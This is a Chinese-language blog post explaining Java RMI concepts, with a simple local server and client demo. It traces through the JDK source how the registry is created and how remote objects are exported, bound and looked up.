        <content type="html"><![CDATA[<h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>Remote Procedure Call，远程过程调用。像本地调用方法一样调用一个远程方法。</p><h2 id="RMI概念"><a href="#RMI概念" class="headerlink" title="RMI概念"></a>RMI概念</h2><p>RMI，全程Remote Method Invocation，远程方法调用，一种用于实现远程过程调用的应用编程接口。</p><p>它使客户端上运行的程序可以调用远程服务器上对象的方法，即通过某个java虚拟机上的对象来调用另一个java虚拟机中对象的方法。</p><p>客户端获取的是远程主机上对象的引用，无论何处使用引用，方法调用都发生在原始对象上</p><p>RMI实现了RPC，通常使用Java原生反序列化，并且可以结合动态类加载和安全管理器来安全传输一个Java类。</p><h2 id="远程对象和非远程对象"><a href="#远程对象和非远程对象" class="headerlink" title="远程对象和非远程对象"></a>远程对象和非远程对象</h2><p>远程对象：RMI中的远程对象首先需要可以序列化；并且需要实现特殊远程接口的对象，该接口指定可以远程调用对象的哪些方法；其次该对象是通过一种可以通过网络传递的特殊对象引用来使用的。和普通的 Java 对象一样，远程对象是通过引用传递。也就是在调用远程对象的方法时是通过该对象的引用完成的。</p><p>非远程对象：非远程对象与远程对象相比只是可被序列化而已，并不会像远程对象那样通过调用远程对象的引用来完成调用方法的操作，而是将非远程对象做一个简单地拷贝，也就是说非远程对象是通过拷贝进行传递。</p><h2 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h2><p>RMI引入Stub（客户端存根）和Skeleton（服务端骨架）两个概念。</p><p>当我们在远程对象上调用方法，实际上是调用一些本地代码作为该对象的代理。也就是当客户端试图调用一个远端对象，实际上会调用客户端本地的一个代理类，也就是Stub。而在调用服务器端的目标类之前，也会经过一个对应的代理类，也就是Skeleton。它从Stub接受远程方法调用并将他们传递给对象。</p><h2 id="RMI架构"><a href="#RMI架构" class="headerlink" title="RMI架构"></a>RMI架构</h2><ul><li>client：客户端，发起远程调用请求，持有Stub作为远程对象的本地代理</li><li>server：服务端，提供远程服务，通过Skeleton接受并处理请求</li><li>Registry：注册中心，存储服务名称与远程对象引用的映射，类似于RMI的电话薄。类似于一个网关，自己并不执行远程方法。但服务器可以在上面注册一个Name到对象的绑定关系。客户端通过Name向注册中心查询，得到绑定关系后，再链接到服务端。使用注册中心查找对另一台主机上已经注册远程对象的引用。</li></ul><p><img src="/archives/9738c3bd/o_241125134804_rmi0.png" alt="img"></p><h2 id="实现接口和类"><a href="#实现接口和类" class="headerlink" title="实现接口和类"></a>实现接口和类</h2><h3 id="远程接口"><a href="#远程接口" class="headerlink" title="远程接口"></a>远程接口</h3><p>该接口指定可以远程调用远程对象的哪些方法。远程接口必须继承java.rmi.Remote接口，远程对象将实现这个远程接口。</p><p>注意即使是public修饰字段都不能通过远程接口来进行访问，如果需要访问，可通过编写一些setter和getter方法</p><p>远程接口中所以方法都需要抛出java.rmi.RemoteException异常</p><h3 id="java-rmi-Remote接口"><a href="#java-rmi-Remote接口" class="headerlink" title="java.rmi.Remote接口"></a>java.rmi.Remote接口</h3><p>java.rmi.Remotie接口用于标识可从非本地虚拟机调用其方法的接口。作为远程对象必须直接或间接实现该接口。只有那些实现了远程接口（java.rmi.Remote接口或继承java.rmi.Remote接口）的方法才能被远程调用。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果服务端实现该接口并重写了该方法就能被调用</p><h3 id="java-rmi-server-UnicastRemoteObject类"><a href="#java-rmi-server-UnicastRemoteObject类" class="headerlink" title="java.rmi.server.UnicastRemoteObject类"></a>java.rmi.server.UnicastRemoteObject类</h3><p>RMI提供了一些远程对象实现可以继承的便利类，这些类有助于远程对象的创建，其中包括java.rmi.server.UnicastRemoteObject类。</p><p>通常远程对象类需要继承java.rmi.server.UnicastRemoteObject类，在RMI中 UnicastRemoteObject类是与Object超类等效的，该类提供了<code>equals( )</code> , <code>hashcode( )</code>, <code>toString( )</code>方法；并且在RMI运行时，继承UnicastRemoteObject类的子类会被<code>exports</code> 出去，绑定随机端口，开始监听来自客户端（Stubs）的请求。</p><p>而如果去掉该类，就无法生成Stub代理对象，而RMI注册表Registry在绑定对象时需要传递Stub对象，则导致序列化对象时对象未导出使序列化错误。</p><h2 id="RMI动态加载类"><a href="#RMI动态加载类" class="headerlink" title="RMI动态加载类"></a>RMI动态加载类</h2><p>前面说过RMI可使用动态加载类和安全管理器来安全传输Java类</p><p>在RMI过程中客户端和服务器数据传输有以下特点：</p><p>RMI的客户端和服务端是通过将数据进行序列化来传输的，所以当我们传递一个可序列化的对象作为参数进行传输时，在服务端肯定会对其进行反序列化。</p><p>在RMI的动态加载类机制中，如果需要用到某个类但JVM中没有这个类，它可以通过远程URL去下载这个类。那么这个URL可以是http、ftp协议，加载时可以加载某个第三方类库jar包下的类，或者在指定URL时在最后以<code>\</code>结束来指定目录，从而通过类名加载该目录下的指定类。</p><p>RMI动态加载时用到的是<code>java.rmi.server.codebase</code>属性，该属性表示一个或多个URL位置，可以从中下载本地（CLASSPATH）找不到的类，相当于一个代码库。</p><p>设置<code>java.rmi.server.codebase</code>属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>,<span class="string">&quot;http://127.0.0.1:5432/&quot;</span>);</span><br><span class="line">或</span><br><span class="line">java -Djava.rmi.server.codebase=<span class="string">&quot;http://127.0.0.1:5432/&quot;</span></span><br></pre></td></tr></table></figure><p>对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的<code>java.rmi.server.codebase</code>URL去加载类。</p><p>对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的<code>java.rmi.server.codebase</code>URL去加载对应的类。</p><p>客户端与服务端两边的<code>java.rmi.server.codebase</code>URL都是互相传递的。</p><p>但无论是客户端还是服务端要远程加载类，都需要满足：</p><ul><li>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要远程加载类，需要安装RMISecurityManager并配置java.security.policy</li><li>属性java.rmi.server.useCodebaseOnly的值必须为false</li></ul><p>有三种方法配置policy：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">java -Djava.security.policy=rmi.policy</span><br><span class="line"></span><br><span class="line">System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RemoteServer.class.getClassLoader().getResource(<span class="string">&quot;rmi.policy&quot;</span>).toString());</span><br></pre></td></tr></table></figure><h2 id="RMI-Demo"><a href="#RMI-Demo" class="headerlink" title="RMI Demo"></a>RMI Demo</h2><h3 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h3><p>先定义一个远程接口，远程接口定义我们需要使用的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RMIInterface</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>服务端需要在注册中心注册远程对象，所以一般服务端和注册中心registry一起的。</p><p>先定义一个实现该接口的类来重写Hello方法，即我们的远程对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMItest</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RMIInterface</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">RMItest</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">Hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后注册一个Name，在注册中心绑定远程对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">server</span> &#123;</span><br><span class="line">    <span class="comment">//rmi服务地址</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">5432</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//注册RMI端口</span></span><br><span class="line">        LocateRegistry.createRegistry(PORT);</span><br><span class="line">        <span class="comment">//绑定远程对象</span></span><br><span class="line">        RMIInterface o=<span class="keyword">new</span> <span class="title class_">RMItest</span>();</span><br><span class="line">        Naming.rebind(RMI_NAME,o);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMI服务在：&quot;</span>+RMI_NAME);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>向注册中心查询相应的Name，并调用远程对象的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> rmi.server.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br><span class="line">        System.out.println(Arrays.toString(registry.list()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//寻找对应RMI实例</span></span><br><span class="line">        RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</span><br><span class="line">        <span class="comment">//调用远程对象的方法</span></span><br><span class="line">        System.out.println(o.Hello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先启动服务端RMI服务，运行服务端代码，然后运行客户端查询并调用远程对象方法：<br>服务端：</p><p><img src="/archives/9738c3bd/image-20250708205555204.png" alt="image-20250708205555204"></p><p>客户端：</p><p><img src="/archives/9738c3bd/image-20250708205611753.png" alt="image-20250708205611753"></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h4><h5 id="定义rmi服务器地址"><a href="#定义rmi服务器地址" class="headerlink" title="定义rmi服务器地址"></a>定义rmi服务器地址</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//rmi服务地址</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String HOST=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> PORT=<span class="number">5432</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String RMI_PATH=<span class="string">&quot;/b1uel0n3&quot;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String RMI_NAME=<span class="string">&quot;rmi://&quot;</span>+HOST+<span class="string">&quot;:&quot;</span>+PORT+RMI_PATH;</span><br></pre></td></tr></table></figure><p>这部分是为了定义rmi的服务器地址</p><h5 id="创建RMI注册中心"><a href="#创建RMI注册中心" class="headerlink" title="创建RMI注册中心"></a>创建RMI注册中心</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LocateRegistry.createRegistry(PORT);</span><br></pre></td></tr></table></figure><p>跟进一下：</p><p><img src="/archives/9738c3bd/image-20250709144331339.png" alt="image-20250709144331339"></p><p>LocateRegistry.createRegistry方法会返回一个RegistryImpl对象，继续跟进：</p><p><img src="/archives/9738c3bd/image-20250709144502024.png" alt="image-20250709144502024"></p><p>这里if和else逻辑是相似的，都会创建一个LiveRef对象，port传入作为注册中心的端口，LiveRef是一个网络引用的类，用于网络请求方面，后面会提到，这里我们传入了端口。</p><p>然后将其封装进UnicastServerRef对象，随后调用RegistryImpl.setup方法传入UnicastServerRef对象，所以注意这个LiveRef在后面的分析中都会存在：</p><p><img src="/archives/9738c3bd/image-20250709145113967.png" alt="image-20250709145113967"></p><p>在setup方法中会调用uref.exportObject(this,null,ture)方法：<br><img src="/archives/9738c3bd/image-20250709145402351.png" alt="image-20250709145402351"></p><p>其中this为RegistryImpl对象</p><p><img src="/archives/9738c3bd/image-20250709150048125.png" alt="image-20250709150048125"></p><p>先看第一个，在UnicastServerRef.exportObject方法中会调用Util.createProxy创建一个代理类，看名字似乎是创建stub客户端存根，跟进createProxy方法：<br><img src="/archives/9738c3bd/image-20250709150925975.png" alt="image-20250709150925975"></p><p>关键是这段，他先调用stubClassExists方法：<br><img src="/archives/9738c3bd/image-20250709151023637.png" alt="image-20250709151023637"></p><p>该方法会寻找RegistryImpl_stub，然后返回ture</p><p>接着进入createStub方法，remoteClass就是我们的RegistryImpl对象：</p><p><img src="/archives/9738c3bd/image-20250709151332772.png" alt="image-20250709151332772"></p><p>这里的逻辑就是会返回RegistryImpl_stub实例，即stub变量就是RegistryImpl_stub实例</p><p>接着回到我们的UnicastServerRef.exportObject方法，看第二部分：</p><p><img src="/archives/9738c3bd/image-20250709151632319.png" alt="image-20250709151632319"></p><p>当stub为RemoteStub实例时会调用setSkeleton(impl)，而stub是RegistryImpl_stub实例继承RemoteStub，所以会调用setSkeleton(impl)，impl为RegistryImpl对象，看方法名似乎是设置服务端存根Skeleton，跟进一下：</p><p><img src="/archives/9738c3bd/image-20250709152024487.png" alt="image-20250709152024487"></p><p>这里调用Util.createSkeleton(impl)方法并赋值给skel：<br><img src="/archives/9738c3bd/image-20250709152355545.png" alt="image-20250709152355545"></p><p>这里获取Registry_Skel赋值给skelname变量，最后返回Registry_Skel实例，所以第二部分就是将Registry_Skel实例赋值给skel，相当于创建Skeleton根存</p><p>最后看第三部分：</p><p><img src="/archives/9738c3bd/image-20250709152728637.png" alt="image-20250709152728637"></p><p>最后实例化了一个Target类，这个Target对象封装了我们RegistryImpl对象和RegistryImpl_Stub对象</p><p>接着调用liveRef.exportObject将我们封装好的对象发布出去，具体看看它的发布逻辑：</p><p><img src="/archives/9738c3bd/image-20250709172411239.png" alt="image-20250709172411239"></p><p>ep的值就跟我们前面的创建的LiveRef对象有关了，查看构造方法：</p><p><img src="/archives/9738c3bd/image-20250709172949321.png" alt="image-20250709172949321"></p><p><img src="/archives/9738c3bd/image-20250709173226184.png" alt="image-20250709173226184"></p><p><img src="/archives/9738c3bd/image-20250709173321043.png" alt="image-20250709173321043"></p><p>ep为endpoint，而根据我们之前创造的LiveRef对象，ep为TCPEndpoint.getLocalEndpoint(port)：</p><p><img src="/archives/9738c3bd/image-20250709173731622.png" alt="image-20250709173731622"></p><p>该方法调用getLoclaEndpoint方法：</p><p><img src="/archives/9738c3bd/image-20250709174216894.png" alt="image-20250709174216894"></p><p>而在getLoclaEndpoint方法中会创建一个TCPEndpoint对象并获取了端口号等信息，最后返回ep，所以最后会调用TCPEndpoint.exportObject(target)方法：<br><img src="/archives/9738c3bd/image-20250709210325033.png" alt="image-20250709210325033"></p><p>然后调用transport.exportObject(target)，这里transport为TCPTransport对象，即调用TCPTransport.exportObject(target):<br><img src="/archives/9738c3bd/image-20250710102555375.png" alt="image-20250710102555375"></p><p>这里调用了listen()方法开启监听：<br><img src="/archives/9738c3bd/image-20250710092931067.png" alt="image-20250710092931067"></p><p>在TCPTransport.listen中，先获取 TCPEndpoint，获取端口号后执行<code>server = ep.newServerSocket();</code>创建一个新的socket，就等别人来连接:</p><p><img src="/archives/9738c3bd/image-20250710093246692.png" alt="image-20250710093246692"></p><p>而在建立socket过程中，如果端口号为0即默认值，就会创建一个随机端口，而创建注册中心时我们传入了端口，所以端口为5432:</p><p><img src="/archives/9738c3bd/image-20250710093457076.png" alt="image-20250710093457076"></p><p>之后在调用<code>super.exportObject(target);</code>完成连接之后的事，跟进Transport.exportObject(target)：</p><p><img src="/archives/9738c3bd/image-20250710102703906.png" alt="image-20250710102703906"></p><p>主要将Target对象存放进ObjectTable中，ObjectTable用来管理所有发布的服务实例Target</p><p>这时我们来看看Stub的值：</p><p><img src="/archives/9738c3bd/image-20250711163644365.png" alt="image-20250711163644365"></p><p>新出现了DGCImpl_Stub，而Skel也变为了DGCImpl_Skel，这是分布式垃圾回收的一个对象，这个后面再提。</p><p>发布完后最后返回stub</p><p>最后看下发布对象后的变量：</p><p><img src="/archives/9738c3bd/image-20250710100004461.png" alt="image-20250710100004461"></p><p>skel为Registry_Skel对象，stub为RegietryImpl_Stub对象</p><h5 id="创建远程对象"><a href="#创建远程对象" class="headerlink" title="创建远程对象"></a>创建远程对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIInterface o=<span class="keyword">new</span> <span class="title class_">RMItest</span>();</span><br></pre></td></tr></table></figure><p>这里创建了远程对象实例</p><p><img src="/archives/9738c3bd/image-20250709154218314-17520469398211.png" alt="image-20250709154218314"></p><p>调用父类的构造方法，即UnicastRemoteObject的构造方法：</p><p><img src="/archives/9738c3bd/image-20250709154340649.png" alt="image-20250709154340649"></p><p>这里默认port为0，所以后面创建socket时会分配随机端口，调用exportObject方法：</p><p><img src="/archives/9738c3bd/image-20250709154708191.png" alt="image-20250709154708191"></p><p>返回一个exportObject对象，传入obj和UnicastServerRef对象，UnicastServerRef对象主要用于指定端口创建远程对象通信，obj为我们的远程对象RMItest，继续跟进exportObject方法：</p><p><img src="/archives/9738c3bd/image-20250709155512366.png" alt="image-20250709155512366"></p><p>后面进入sref.exportObject方法了：</p><p><img src="/archives/9738c3bd/image-20250709160244608.png" alt="image-20250709160244608"></p><p>后面的流程就跟创建注册中心时的一样，但参数不一样，先看stub赋值：</p><p><img src="/archives/9738c3bd/image-20250709161240235.png" alt="image-20250709161240235"></p><p><img src="/archives/9738c3bd/image-20250709161214866.png" alt="image-20250709161214866"></p><p>由于在Util.createProxy中会调用stubClassExists方法来寻找是否存在RMItest_Stub对象，但由于我们并没有注册，所以肯定是没有的，此时就不会调用createStub方法，而是跳出执行后面的方法：<br><img src="/archives/9738c3bd/image-20250709162602433.png" alt="image-20250709162602433"></p><p>clientRef是UnicastRef对象，这里用RemoteObjectInvocationHandler为UnicastRef对象创建了动态代理</p><p>最后返回一个Remote类型的代理类，当调用代理类的方法时，就会调用RemoteObjectInvocationHandler.invoke方法：</p><p><img src="/archives/9738c3bd/image-20250709163709760.png" alt="image-20250709163709760"></p><p><img src="/archives/9738c3bd/image-20250709163954589.png" alt="image-20250709163954589"></p><p>在invoke方法中会对调用方法类型进行判断，allowFinalizeInvocation默认为true，当调用方法为Object对象时调用invokeObjectMethod方法，否则调用invokeRemoteMethod方法</p><p><img src="/archives/9738c3bd/image-20250709164158605.png" alt="image-20250709164158605"></p><p>而在invokeObjectMethod方法中，只对hashCode、equals、toString方法进行处理</p><p>而在另一个invokeRemoteMethod方法中，调用了另一invoke方法：</p><p><img src="/archives/9738c3bd/image-20250709164535895.png" alt="image-20250709164535895"></p><p>这里的ref是我们创建动态代理时传入的对象：<br><img src="/archives/9738c3bd/image-20250709170113725.png" alt="image-20250709170113725"></p><p>为UnicastRef，跟进UnicastRef.invoke：</p><p><img src="/archives/9738c3bd/image-20250709170252692.png" alt="image-20250709170252692"></p><p>这段代码主要用于建立通道连接</p><p><img src="/archives/9738c3bd/image-20250709170924820.png" alt="image-20250709170924820"></p><p>然后进行远程方法的调用，try部分主要是序列化调用参数，序列化失败时会抛出错误</p><p>接着看UnicastServerRef.exportObject方法</p><p><img src="/archives/9738c3bd/image-20250709171856409.png" alt="image-20250709171856409"></p><p>由于这时stub是代理类，所以不会执行setSkeleton方法</p><p><img src="/archives/9738c3bd/image-20250709172034601.png" alt="image-20250709172034601"></p><p>最后实例化了一个Target类，这个Target对象封装了我们远程对象和生成的动态代理类</p><p>然后调用exportObject(target)发布我们封装好的对象：</p><p><img src="/archives/9738c3bd/image-20250710100642524.png" alt="image-20250710100642524"></p><p>注意TCPEndpoint.newServerSocket在创建socket过程中会随机分配端口</p><p><img src="/archives/9738c3bd/image-20250710101126223.png" alt="image-20250710101126223"></p><p>可以看到执行完后随机分配了56272端口</p><p>后面同样的流程，开启监听后执行super.exportObject(target);方法：</p><p><img src="/archives/9738c3bd/image-20250711163351013.png" alt="image-20250711163351013"></p><p>即transport.exportObject(target)：</p><p><img src="/archives/9738c3bd/image-20250711163434555.png" alt="image-20250711163434555"></p><p>主要就是将我们主要将Target对象存放进ObjectTable中，ObjectTable用来管理所有发布的服务实例Target，执行期间Stub和Skel成为了DGCImpl_Stub和DGCImpl_Skel分布式垃圾回收对象</p><h5 id="绑定远程服务对象"><a href="#绑定远程服务对象" class="headerlink" title="绑定远程服务对象"></a>绑定远程服务对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naming.rebind(RMI_NAME,o);  <span class="comment">//也可以选用bind方法</span></span><br></pre></td></tr></table></figure><p>将相应的远程对象和RMI服务端地址RMI_NAME进行绑定</p><p><img src="/archives/9738c3bd/image-20250710110101484.png" alt="image-20250710110101484"></p><p><img src="/archives/9738c3bd/image-20250710111216157.png" alt="image-20250710111216157"></p><p>先获取服务器地址URL，然后对其名字，host，port进行解析，然后获取相应端口的Stub（RegistryImpl_Stub对象），然后调用<code>Stub.rebind(parsed.name, obj);</code>方法，传入的是远程对象和RMI_NAME解析后的名字:</p><p><img src="/archives/9738c3bd/image-20250710110558010.png" alt="image-20250710110558010"></p><p>先调用super.ref.newCall方法，也就是UnicastRef.newCall方法，该方法主要是建立一个网络连接：</p><p><img src="/archives/9738c3bd/image-20250710111856838.png" alt="image-20250710111856838"></p><p>然后获取remoteCall的流，用同个流对名字和远程对象进行序列化操作，这里的操作主要是为了将RMI服务器名字和远程对象进行绑定：</p><p><img src="/archives/9738c3bd/image-20250710112053138.png" alt="image-20250710112053138"></p><p>接着执行ref.invoke方法进行网络传输，这里this.ref为UnicastRef，传入remoteCall：</p><p><img src="/archives/9738c3bd/image-20250710112404355.png" alt="image-20250710112404355"></p><p>跟进去，发现在StreamRemoteCall.executeCall方法中调用了readObject方法：</p><p><img src="/archives/9738c3bd/image-20250710113145296.png" alt="image-20250710113145296"></p><p>最后在服务端骨架处反序列化绑定</p><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><h5 id="获取注册中心"><a href="#获取注册中心" class="headerlink" title="获取注册中心"></a>获取注册中心</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(HOST,PORT);</span><br></pre></td></tr></table></figure><p>通过指定host和port获取指定注册中心的客户端存根</p><p><img src="/archives/9738c3bd/image-20250710115215120.png" alt="image-20250710115215120"></p><p>调用getRegistry方法：</p><p><img src="/archives/9738c3bd/image-20250710115302292.png" alt="image-20250710115302292"></p><p>该方法最后返回调用Util.createProxy方法返回指定注册中心的客户端代理Stub</p><h5 id="查找获取远程对象"><a href="#查找获取远程对象" class="headerlink" title="查找获取远程对象"></a>查找获取远程对象</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RMIInterface o=(RMIInterface) Naming.lookup(RMI_NAME);</span><br></pre></td></tr></table></figure><p>通过 RMI 命名服务查找并获取远程对象的存根（stub）</p><p>Naming.lookup()是RMI 的命名服务类，提供基于名称的对象查找功能：</p><p><img src="/archives/9738c3bd/image-20250710143646649.png" alt="image-20250710143646649"></p><p>获取服务器地址URL，然后对其名字，host，port进行解析，然后获取相应端口的Stub（RegistryImpl_Stub对象）：</p><p><img src="/archives/9738c3bd/image-20250710143905408.png" alt="image-20250710143905408"></p><p>然后调用Stub.lookup，即RegistryImpl_Stub.lookup方法：</p><p><img src="/archives/9738c3bd/image-20250710144222432.png" alt="image-20250710144222432"></p><p>先通过UnicastRef.newCall方法建立连接，然后获取remoteCall的流将其序列化发送到服务端，接着调用UnicastRef.invoke方法执行远程调用将请求发送到 RMI 注册表服务器，服务端在注册表中查找对应名称的绑定：</p><p><img src="/archives/9738c3bd/image-20250710150421152.png" alt="image-20250710150421152"></p><p>调用call.executeCall()方法：</p><p><img src="/archives/9738c3bd/image-20250710150754684.png" alt="image-20250710150754684"></p><p>调用了in.readObject方法：</p><p><img src="/archives/9738c3bd/image-20250710150914832.png" 